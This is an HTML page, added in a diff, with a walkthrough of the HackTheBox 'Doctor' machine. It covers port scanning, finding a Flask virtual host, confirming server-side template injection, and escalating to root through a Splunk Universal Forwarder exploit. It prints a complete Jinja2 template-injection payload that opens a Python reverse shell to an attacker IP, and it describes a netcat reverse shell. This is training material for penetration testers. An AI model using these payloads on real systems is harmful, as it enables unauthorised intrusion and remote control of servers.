@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="icon" type="image/png" href="../img/main/favicon-16.png" />
+<title>
+
+Doctor - HackTheBox Writeup
+
+</title>
+<style>
+html {
+  box-sizing: border-box;
+}
+
+*, *:before, *:after {
+  box-sizing: inherit;
+}
+
+.column {
+  float: left;
+  width: 33.3%;
+  margin-bottom: 16px;
+  padding: 0 8px;
+}
+
+@media screen and (max-width: 450px) {
+  .sidenav {padding-top: 15px;}
+  .sidenav a {font-size: 18px;}
+  .column {
+    width: 100%;
+    display: block;
+  }
+}
+
+.card {
+  box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);
+  background-color:  #212f3d;
+}
+
+.container {
+  padding: 0 16px;
+}
+
+.container::after, .row::after {
+  content: "";
+  clear: both;
+  display: table;
+}
+
+.title {
+  color: grey;
+}
+
+.button {
+  border: none;
+  outline: 0;
+  display: inline-block;
+  padding: 8px;
+  color: white;
+  background-color: #000;
+  text-align: center;
+  cursor: pointer;
+  width: 100%;
+}
+
+.button:hover {
+  background-color: #555;
+}
+
+body {
+  font-family: "Lato", sans-serif;
+}
+
+.sidenav {
+  height: 100%;
+  width: 0;
+  position: fixed;
+  z-index: 1;
+  top: 0;
+  left: 0;
+  background-color: #111;
+  overflow-x: hidden;
+  transition: 0.5s;
+  padding-top: 60px;
+}
+
+.sidenav a, .dropdown-btn {
+  padding: 8px 8px 8px 32px;
+  text-decoration: none;
+  font-size: 25px;
+  color: #818181;
+  display: block;
+  border: none;
+  background: none;
+  text-align: left;
+  cursor: pointer;
+  outline: none;
+  transition: 0.3s;
+}
+
+.sidenav a:hover, .dropdown-btn:hover {
+  color: #f1f1f1;
+}
+
+.main {
+  margin-left: 200px; 
+  font-size: 20px; 
+  padding: 0px 10px;
+}
+
+.active {
+  background-color: #993399;
+  color: white;
+}
+
+.dropdown-container {
+  display: none;
+  background-color: #262626;
+  padding-left: 8px;
+}
+
+.sidenav .closebtn {
+  position: absolute;
+  top: 0;
+  right: 25px;
+  font-size: 36px;
+  margin-left: 50px;
+}
+
+code {
+  display: inline-block;
+  font-family: Consolas,"courier new";
+  color: white;
+  background-color: #310d3d;
+  padding-left: 2px;
+  padding-right: 2px;
+  margin-left: 8%;
+  font-size: 105%;
+  max-width: 100%
+}
+
+p, h2 {
+  padding-left: 5%;
+  padding-right: 5%;
+}
+
+img {
+  padding-left: 8%;
+  padding-right: 8%;
+}
+
+ul{
+  margin-left: 4%;
+}
+</style>
+</head>
+<body bgcolor="6c1089">
+  <div id="mySidenav" class="sidenav">
+  <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
+  <a href="../index.html">Home</a>
+  <button class="dropdown-btn">Writeups & Walkthroughs
+  </button>
+  <div class="dropdown-container">
+    <a href="../hackthebox.html">HackTheBox Writeups</a>
+    <a href="#">VulnHub Writeups</a>
+    <a href="#">CyberSecLabs Writeups</a>
+  </div>
+  <a href="../whoami.html">About</a>
+</div>
+
+<div id="nav">
+  <span style="font-size:30px;cursor:pointer;color: black;" onclick="openNav()">&#9776;</span>
+</div>
+<div id="main">
+ <p align="center"><img src="../img/htb/doctor/doc-info.png" alt="hackthebox-doctor.png" style="max-width:100%;height:auto;">
+ </p><br>
+ <p>Doctor was an interesting and fun box created by the user egotisticalSW which employed the use of an injection vulnerability in a web application to obtain a foothold and gain initial access. Privilege escalation was pretty straightforward and involved abusing the Splunk service running on the machine using a publicly available exploit.</p>
+ <h2>Overview of the Target</h2>
+ <ul>
+  <li><b>Operating System:</b> Linux</li>
+    <li><b>IP address:</b> 10.10.10.209</li>
+    <li><b>Difficulty:</b> Easy</li>
+  </ul>
+  <h2>Scanning and Reconnaissance</h2>
+  <p>As always we start off with an nmap scan to get an idea about what ports are open. These ports will serve as potential points of entry and will also provide us valuable information regarding the system. In the first scan we check all the 65535 ports to specify which ports are open, and in the second scan we will scan and dig deeper into the open ports. The command for the first scan is shown below.</p>
+  <code>sudo nmap -p- -oN nmap/Doctor-openports 10.10.10.209</code>
+  <ul><li><b>-p-</b>: scan all ports (from 1 to 65535)</li>
+    <li><b>-oN nmap/Doctor-openports</b>: write the results of the scans to the file 'Doctor-openports' located in the nmap directory</li></ul>
+  <p>Running this command gives us the below output,</p> 
+  <img src="../img/htb/doctor/openports.png" alt="Doctor-openports.png" style="max-width:100%;height:auto;">
+  <p>Port 22 and 80 are well known ports running the SSH and HTTP services respectively. I didn't know what service was running on port 8089, but I had a hunch that it had something to do with HTTP since some administrators configure web servers on ports 8000 and 8080. Before using Google to confirm this we will run the second in-depth nmap scan of all these open ports using the below command.</p>
+  <code>sudo nmap -p 22,80,8089 -sC -sV -oN nmap/Doctor-full 10.10.10.209</code>
+  <ul><li><b>-p 22,80,8089</b>: here we are instructing Nmap to only scan these three ports</li>
+    <li><b>-sC</b>: Performs a script scan using the default set of scripts.</li>
+    <li><b>-sV</b>: Enables version detection. </li>
+    <li><b>-oN nmap/Doctor-full</b>: write the results of the scans to the file 'Doctor-full' located in the nmap directory</li>
+  </ul>
+  <img src="../img/htb/doctor/nmap-full.png" alt="doctor-fullnmapscan.png" style="max-width:100%;height:auto;">
+  <p>From the above output, we can find quite a lot of useful information about the services running on the ports and about the system itself.</p>
+  <ul>
+  <li><b>Port 22 (SSH)</b>: Port 22 is running the OpenSSH package version 8.2p1 4ubuntu0.1. We could search this package version to potentially find out the version of the operating system itself.</li>
+  <li><b>Port 80 (HTTP)</b>: Port 80 is an Apache web server running Apache 2.4.4.1</li>
+  <li><b>Port 8089</b>: Port 8089 seems to be serving a website too (one that utilizes SSL certificates). But the http-title and the version name displays 'Splunkd'. This was probably a Splunk web interface, so I decided to Google (at last) what this port 8089 was about.</li></ul>
+  <p>For those who have no idea what Splunk is, I highly recommend <a href="https://www.edureka.co/blog/what-is-splunk/">reading this article</a>. After Googling "Splunk port 8089" I found out that it is the default management port for all Splunk instances. So this is like the web management port for Splunk since it is using HTTPS.<br>
+  The OpenSSH and Apache httpd package versions were released to Ubuntu Focal (20.04) and didn't have many vulnerabilities of interest that could allow an attacker an easy way in and we had no information on the Splunk service version. The system needed to be enumerated further.</p>
+  <h2>Enumeration of the Splunk management service</h2>
+  <p>The Splunk management port can be accessed by visiting the URL <b>https://10.10.10.209:8089</b> on a web browser. Upon visiting, the below web page is presented.</p>
+  <img src="../img/htb/doctor/splunk-8089.png" alt="splunk-port-8089.png" style="max-width:100%;height:auto;">
+  <p>From the displayed web page we can further gain information on when the Splunk service was updated (which was very recently) and most importantly the version of the service which was stated as <b>8.0.5</b>. We could look this version up on Google to gain more information about the service and how to enumerate it further or for any exploits that could lead us in. The web page also displays a few links with interesting names but when clicked, the user is prompted to authenticate with their credentials. We had no available usernames or passwords to provide, and so tried out a few common default passwords (admin:admin, admin:password, administrator:password etc.). Upon searching Google for 'Splunk default credentials port 8089', I came across <a href="https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2">this article</a> from 2018, which provided a lot of interesting and useful information including an exploit which we could potentially use for privilege escalation.<br>
+  The article mentions that the default username-password combination is admin:changeme but the default credentials were not authenticated from remote hosts. But still it was worth a try..</p>
+  <img src="../img/htb/doctor/splunk-defaults.png" alt="splunk-default-credentials.png" style="max-width:100%;height:auto;">
+  <p>The server does not accept the default credentials remotely like the article says and it is also extremely likely that the credentials had been changed. The writer mentions that bruteforcing the admin password is possible since their is no account lockout mechanism, but this is a last resort option.</p>
+  <p>The article mentions of a privilege escalation exploit with the management service. There are two ways of using the exploit, local privilege escalation to the user that the forwarder is running under, if the default password is not changed or remote command execution (with the privileges that the forwarder is running under) if the default password has been changed and is known to the attacker. The latter sounds interesting since it was likely that the default credentials were changed and if we got our hands on some credentials from further enumeration we could probably use it as a potential privilege escalation vector. The author also provides us the exploit called the "Splunk Whisperer" from his own <a href="https://github.com/airman604/splunk_whisperer">GitHub repository.</a></p> 
+  <h2>Enumeration of the Apache web server</h2>
+  <p>Since we couldn't find any credentials for the Splunk management console the target needed to be enumerated further. The target hosts an Apache web server on the common HTTP port 80. By keying in the address <b>http://10.10.10.209</b> at the browser we are taken to a website which looks like an online medical services website.</p>
+  <img src="../img/htb/doctor/website-port80.png" alt="doctor-website.png" style="max-width:100%;height:auto;">
+  <p>In the web page we find an interesting piece of information- an email address showing us the domain name <b>doctors.htb</b>. This can be used to check whether the server is utilizing virtual hosting (hosting multiple domains on a single server).</p>
+  <img src="../img/htb/doctor/hostname-found.png" alt="hostname-found.png" style="max-width:100%;height:auto;">
+  <p>When browsing through a target website it's always a good idea to set up Burp Suite with intercept off in the background, this way you can gather all the requests and responses to analyze when necessary. Since we haven't entered the domain name doctors.htb in our DNS records, we can use Burp Suite to check if virtual hosting is enabled. By sending a captured request to the Repeater tool and editing the Host field from <b>10.10.10.209</b> to <b>doctors.htb</b> we can observe the difference in the server responses. The below image is an unedited GET request to <b>http://10.10.10.209</b> and in the response we can see that the response code is <b>200 OK</b> implying success and we are served the web page.
+  </p>
+  <img src="../img/htb/doctor/burp.png" alt="burp-get-request.png" style="max-width:100%;height:auto;">
+  <p>However, upon changing the host field in the request to <b>doctors.htb</b> and sending it to the server we receive a different response. The new response is a redirect (302 FOUND) and we find some new information from the response fields. The server field says "<b>Werkzeug/1.0.1 Python/3.8.2</b>" (Werkzeug is a WSGI web application library used by Flask web applications, more on that <a href="https://palletsprojects.com/p/werkzeug/">here</a>) and the location field is displayed as <b>http://doctors.htb/login?next=%2F</b>. These say that we are interacting with a whole new web application than the previous website. This confirms that the target has <a href="https://httpd.apache.org/docs/current/vhosts/name-based.html">name-based virtual hosting</a> enabled and there is a new and different domain called <b>doctors.htb</b>.</p>
+  <p>The first website (<b>http://10.10.10.209</b>) also had a list of potential usernames (the names of the doctors) and a few articles authored by a user 'admin' which was another username we could possibly use to enumerate the target further. However, these usernames didn't serve any purpose to root the target, but still it is recommended documenting the usernames you can find.</p>
+  <img src="../img/htb/doctor/doctors.png" alt="doctor-names.png" style="max-width:100%;height:auto;">
+  <img src="../img/htb/doctor/admin-posts.png" alt="admin-posts.png" style="max-width:100%;height:auto;"> 
+  <p>The results of a directory listing also revealed nothing interesting. The tool used here is <b>dirsearch.py</b> and it is a very fast and handy web directory bruteforcer which can be found <a href="https://github.com/maurosoria/dirsearch">here</a>.</p>
+  <img src="../img/htb/doctor/dirsearch-ip.png" alt="dirsearch-101010209.png" style="max-width:100%;height:auto;">
+  <h2>Enumerating doctors.htb website</h2>
+  <p>Since the previous website (<b>http://10.10.10.209/</b>) did not provide any other useful information (the hyperlinks doesn't lead anyway either) we can instead focus on the other website that is being hosted on the target- <b>http://doctors.htb</b>. Before browsing the website the DNS entry of the domain name must be entered to the hosts file as shown below.</p>
+  <img src="../img/htb/doctor/hosts-file.png" alt="etc-hosts-file.png" style="max-width:100%;height:auto;">
+  <p>Upon visiting the website we are served a login page with options to log in, register a new account, and a possible password reset option.</p>
+  <img src="../img/htb/doctor/doctors-htb-webpage.png" alt="doctors-htb-webpage.png" style="max-width:100%;height:auto;">
+  <p>After failing to log in via a combination of common passwords (admin, admin123, admin@123 etc..) for the email admin@doctors.htb (since we found out before about the admin user), I decided to attempt SQL injection. But this too was rendered fruitless. Since we didn't possess any valid credentials and our SQL injections were useless, it was time to check the other options.</p> 
+  <p>The "Forgot password?" link directs us to a password reset page where the user is requested to enter their email to reset their own password. After attempting to change the email of the admin user we receive an error which tells us that the email doesn't exist. The same went for the email <b>info@doctors.htb</b>, so it can be assumed that the email was only a clue to lead us here.</p>
+  <img src="../img/htb/doctor/no-admin-acc.png" alt="no-admin-account?.png" style="max-width:100%;height:auto;">
+  <p>The remaining option was to register a new account. The new account we are registering here uses the email <b>testuser@doctors.htb</b> (the email doesn't have to be doctors.htb) and the password <b>test123</b>.</p>
+  <img src="../img/htb/doctor/register-acc.png" alt="registration.png" style="max-width:100%;height:auto;">
+  <p>Upon successful registration we are once again redirected to the login page and a message is displayed reading "Your acccount has been created with a time limit of 20 minutes!".</p>
+  <img src="../img/htb/doctor/login-limit.png" alt="login-limit.png" style="max-width:100%;height:auto;">
+  <p>Upon logging in we can observe that the website is like a blog for the doctors where the user is able to create posts. Before testing out the message posting functionality I decided to run a directory brute force scan to find any hidden directories or files. To perform this we will once again use dirsearch with the following command.</p>
+  <code>sudo dirsearch -w /opt/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,html,txt,cgi -u http://doctors.htb/</code>
+  <ul><li><b>-w</b>: path to wordlist to brute force</li>
+    <li><b>-e</b>: file extensions to check</li>
+    <li><b>-u0</b>: URL to brute force </li>
+  </ul>
+  <img src="../img/htb/doctor/dirsearch-doctors.png" alt="dirsearch-doctors.png" style="max-width:100%;height:auto;">
+  <p>From the directory brute force we find that there is an archive file and a reset_password file (which was the reset password web page from earlier). The archive file was new and we had not visited it before and it was worth checking out. Upon visiting <b>http://doctors.htb/archive</b> we are served a blank web page. There was no content on it and at first glance it seemed to be an empty page. However, the source code of the website shows us that this is actually an XML file.</p>
+  <img src="../img/htb/doctor/empty-page.png" alt="empty-page.png" style="max-width:100%;height:auto;">
+  <img src="../img/htb/doctor/source-archive-xml.png" alt="source-archive-xml.png.png" style="max-width:100%;height:auto;">
+  <p>At this point I had no idea what this XML file's purpose was and I couldn't gain much information from it. But we will be returning here, because this page is actually the key to exploit this machine.</p>
+  <p>Returning back to the website I decided to test the message posting functionality. To do this we create a simple test post and post it into the website.</p>
+  <img src="../img/htb/doctor/test-message.png" alt="test-message.png" style="max-width:100%;height:auto;">
+  <img src="../img/htb/doctor/test-message-posted.png" alt="test-message-posted.png" style="max-width:100%;height:auto;">
+  <p>Next, we can check if this message posting functionality was vulnerable to any form of cross-site scripting. To begin we can insert some simple HTML tags (bold tags, in this case) in our message and post this message to the blog. If the message text appears bold we can conclude that we have some form of cross-site scripting.</p>
+  <img src="../img/htb/doctor/test-message-2.png" alt="html-code-test.png" style="max-width:100%;height:auto;">
+  <p>The above message however was just posted as it was. The HTML tags were not executed and the message was just displayed as it is. Of course, there are multiple ways of testing for cross-site scripting other than simple HTML tags but this didn't seem very likely.</p>
+  <img src="../img/htb/doctor/didnt-work-lol.png" alt="html-code-test-failed.png" style="max-width:100%;height:auto;">
+  <p>However we were able to stumble upon something very interesting! When the archive page (<b>http://doctors.htb/archive</b>) was reloaded we were able to see some added content. It seems like the title section of the posts we created at the blog were added into this XML file. By inspecting the code we can notice that the title of the post is written inside the "< title >" tag. It is possible that this placement of tags is preventing our code from being executed.</p>
+  <img src="../img/htb/doctor/archive-wut.png" alt="archive-title.png" style="max-width:100%;height:auto;">
+  <p>The next step was to check if we could close the title tag and get our code to be executed. But upon revisiting the blog we find out that our account has expired and we needed to register again (to prevent this hassle, send the registration post request captured by Burp Suite to the repeater and send it to the server when the account expires). After re-registering,we crafted the below message and posted it. The 'cat' mentioned in the message just means <a href="https://en.wikipedia.org/wiki/Cat">cat</a>, not the Linux 'cat' command.</p>
+  <img src="../img/htb/doctor/xss-test.png" alt="XSS-payload.png" style="max-width:100%;height:auto;">
+  <p>Once the message is posted we visit the archive page and, voilà! we get our alert. We were able to close the title tag and execute the script successfully. But now what? How can we exploit this further to obtain a foothold on this machine?
+  </p>
+  <img src="../img/htb/doctor/xss-worked.png" alt="XSS-alert.png" style="max-width:100%;height:auto;">
+  <p>After spending a lot of time trying to understand this vulnerability (because I had no idea how to get remote code execution out of this) and trying out various payloads to no avail, I remembered that we were on a Python web framework (Flask) and decided to use Google to look up what injection vulnerabilities were common in Flask web applications. According to <a href="https://blog.nvisium.com/injecting-flask">this article</a> (and almost every other link in the Google search) we find that server-side template injection (SSTI) is very common in Flask applications due to its template engine, Jinja2. After reading up a bit about SSTI vulnerabilities we find that the vulnerability arises when a malicious user enters template syntax instead of normal input and this template code gets executed in the server-side (read more about SSTI <a href="https://portswigger.net/research/server-side-template-injection">here</a>). The next step now is to confirm whether this is actually SSTI and not something else. For this I used the <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">HackTricks page on SSTI</a> as a guide to follow and it mentions that SSTI can be easily mistaken for cross-site scripting and a good way to differentiate the two is by trying a mathematical operation within a template syntax. HackTricks also provided us with a flowchart of various payloads that can be used to identify the template engine that is running in the back-end.</p>
+  <img src="../img/htb/doctor/detect.png" alt="detect-template-engine.png" style="max-width:100%;height:auto;">
+  <p>Since we know that we are interacting with a Flask application and know that Flask depends of Jinja as its template engine we could skip a few steps mentioned above and try the <code style="margin-left: 0;">{{7*'7'}}</code>payload. In this case we will follow the chart from the beginning and try out the <code style="margin-left: 0;">${7*7}</code> as below.</p>
+  <img src="../img/htb/doctor/ssti-test01.png" alt="ssti-test01.png" style="max-width:100%;height:auto;">
+  <p>And then after reloading the archive page we see that the code was not executed. This means that the template engine was either Jinja or Twig (or maybe the template engine was not vulnerable?).
+  </p>
+  <img src="../img/htb/doctor/ssti-test01-op.png" alt="ssti-test01-output.png" style="max-width:100%;height:auto;">
+  <p>According to the flowchart the next payload to try out was <code style="margin-left: 0;">{{7*7}}</code>. After posting this payload as shown below and reloading the archive page we see an alert pop up displaying <code style="margin-left: 0;">49</code>. This confirms the presence of the SSTI vulnerability.</p>
+  <img src="../img/htb/doctor/ssti-test02.png" alt="ssti-test02.png" style="max-width:100%;height:auto;">
+  <img src="../img/htb/doctor/ssti-test02-op.png" alt="ssti-test02-output.png" style="max-width:100%;height:auto;">
+  <h2>Exploiting Server-side Template Injection</h2>
+  <p>The next payload <code style="margin-left: 0;">{{7*'7'}}</code> was entered to confirm that the template engine was Jinja2 which i was most likely to be. The script was executed and the output was shown as <code style="margin-left: 0;">7777777</code>.</p>
+  <img src="../img/htb/doctor/ssti-test03.png" alt="ssti-test03.png" style="max-width:100%;height:auto;">
+  <img src="../img/htb/doctor/ssti-test03-op.png" alt="ssti-test03-op.png" style="max-width:100%;height:auto;"> 
+  <img src="../img/htb/doctor/archive-ssti.png" alt="archive-source.png" style="max-width:100%;height:auto;">
+  <p>At this point we can be sure that the template engine used by the server is Jinja2. After a bit more reading SSTI can be used to obtain a shell via remote code execution on the web server. The <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadsAllTheThings repository</a> contains a lot of payloads that can be tested to obtain a shell. By setting up a listener using netcat on port 13337 and sending out the below payload we are able to obtain a reverse shell when the archive page is reloaded.</p>
+  <code>{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.45\",13337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}</code><br>
+  <br>
+  <img src="../img/htb/doctor/rce-payload.png" alt="rce-payload.png" style="max-width:100%;height:auto;">
+  <img src="../img/htb/doctor/reverse-shell.png" alt="reverse-shell.png" style="max-width:100%;height:auto;">
+  <p>According to the above output we can observe that we have successful access to the target as the user "web". The nect step would be to escalate our privileges to somehow obtain root access.</p>
+  <h2>Target Enumeration & Privilege Escalation</h2>
+  <p>Listing the contents of the home directory we find a directory called "<b>shaun</b>" which is probably a home directory of a user in the system (check the passwd file to confirm). After listing the contents of this directory we find the user flag which however could only be read by the user shaun. This means that we will probably have to escalate our privileges as either shaun (or maybe even higher, root).</p>
+  <img src="../img/htb/doctor/shaun.png" alt="shauns-home-directory.png" style="max-width:100%;height:auto;">
+  <p>For privilege escalation I used the LinPEAS privilege escalation script which can be cloned from <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">this repository</a>. What privilege escalation scripts do is automate the enumeration process and display the results of possible privilege escalation vectors. These scripts are very handy and can be used after manual enumeration to make sure that you didn't miss anything important and to save time. The LinPEAS script must be run on the target itself so we used the <code style="margin-left: 0;">wget</code> command to download it from our local machine and made it an executable by using the <code style="margin-left: 0;">chmod +x linpeas.sh</code>.</p>
+  <img src="../img/htb/doctor/linpeas-sent.png" alt="linpeas-script-transfer.png" style="max-width:100%;height:auto;">
+  <p>Running the script displays a lot of output which must be read thoroughly as to not miss anything important (it is recommended to pipe the output into a separate file if possible). In our case we find that the script has found something interesting within the log files.</p>
+  <img src="../img/htb/doctor/password-found.png" alt="password-found-in-log-files.png" style="max-width:100%;height:auto;">
+  <p>The interesting entry was a POST request made by the reset password functionality at the doctors.htb website with a string identical to a password in the "email" parameter. There is no indication of whose password this was but it was worth trying out a password spray where we will attempt to login using this password with known usernames.</p>
+  <p>The password failed against the root account which was the first we tried but it was successful in logging in to the
+    <b>shaun</b> user account. We have successfully escalated our privileges and was able to read the user flag! (Also upgraded the shell using a Python one-liner)
+  </p>
+  <img src="../img/htb/doctor/shaun-access.png" alt="shaun-access.png" style="max-width:100%;height:auto;">
+  <br>
+  <img src="../img/htb/doctor/user-flag-found.png" alt="user-flag-found.png" style="max-width:100%;height:auto;">
+  <h2>Privilege Escalation via Splunk Universal Forwarder</h2>
+  <p>Going back to the privilege escalation <a href="https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2"></a> exploit we read earlier where an attacker could gain remote code execution with the privileges that the universal forwarder is running under if we have a valid user name and password other than the default credentials. Since we possess a password of the user "Shaun" we could try to log in into the Splunk service at port 8089.  
+  </p>
+  <img src="../img/htb/doctor/splunk-shaun.png" alt="splunk-shaun.png" style="max-width:100%;height:auto;">
+  <p>The credentials of user shaun was successful in logging into the Splunk service. The dashboard provided a different set of links such as <b>admin</b>,<b>auth</b>, and <b>authorization</b> etc. But none of these had anything  further interesting. Since we now have access to the Splunk service we can check to see the Splunk service is running as root.
+  </p>
+  <img src="../img/htb/doctor/splunk-root.png" alt="splunk-root.png" style="max-width:100%;height:auto;">
+  <p>The above output shows us that the splunkd daemon is running under root and if the exploit works as it says we would be able to gain root access. HackTricks also had a <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence">page</a> regarding about this exploit and also provided a link to a tool called <a href="https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2">Splunk Whisperer 2</a>. The tool includes two Python scripts PySplunkWhisperer2_local.py and PySplunkWhisperer2_remote.py with the latter being recommended if the Splunk Universal Forwarder is exposed (like it is in port 8089). 
+  </p>
+  <img src="../img/htb/doctor/use-remote.png" alt="use-remote-exploit.png" style="max-width:100%;height:auto;">
+  <p>After cloning the <a href="https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2">exploit repository</a> to our local system install any requirements mentioned in the requirements.txt file using <code style="margin-left: 0;">pip3 install -r requirements.txt</code>. According to the examples shown by the HackTricks page we are able to send bash commands using the <code style="margin-left: 0;">--payload</code> argument. We could use this to gain a reverse shell from the target as root (since the Splunk service is running under root). Since netcat (and better yet, nc.traditional) was already installed on the target system we could start a listener on the attacking machine and tell the target system to connect back to us with a bash shell using netcat.
+  </p>
+  <img src="../img/htb/doctor/which-nc.png" alt="netcat-is-installed.png" style="max-width:100%;height:auto;">
+  <p>After starting up a netcat listener on port 13337 on the attacking machine and running the exploit tool with the mentioned arguments we are able to see that the target successfully connected to our netcat listener.
+  The arguments provided for the script are,
+  </p>
+  <ul>
+    <li><b>--host:</b> IP address of target running the Splunk Universal Forwarder</li>
+    <li><b>--port:</b> Port number of the Splunk Universal Forwarder</li>
+    <li><b>--lhost:</b> IP address of the attacking machine</li>
+    <li><b>--username:</b> Splunk authentication username</li>
+    <li><b>--password:</b> Password for username provided</li>
+    <li><b>--payload:</b> Payload to be executed</li>
+  </ul>
+  <img src="../img/htb/doctor/exploited.png" alt="splunk-exploited.png" style="max-width:100%;height:auto;">
+  <p>The target was able to connect back to the listener with a simple bash shell as root. We now have root access into the system and can view the final flag within the root directory.</p>
+  <img src="../img/htb/doctor/iamroot.png" alt="rooted.png" style="max-width:100%;height:auto;">
+  <img src="../img/htb/doctor/rootflag.png" alt="root-flag.png" style="max-width:100%;height:auto;">
+</div>
+ <script>
+function openNav() {
+  document.getElementById("mySidenav").style.width = "300px";
+}
+
+function closeNav() {
+  document.getElementById("mySidenav").style.width = "0";
+}
+
+var dropdown = document.getElementsByClassName("dropdown-btn");
+var i;
+
+for (i = 0; i < dropdown.length; i++) {
+  dropdown[i].addEventListener("click", function() {
+  this.classList.toggle("active");
+  var dropdownContent = this.nextElementSibling;
+  if (dropdownContent.style.display === "block") {
+  dropdownContent.style.display = "none";
+  } else {
+  dropdownContent.style.display = "block";
+  }
+  });
+}
+ </script>
+</body>
+</html>
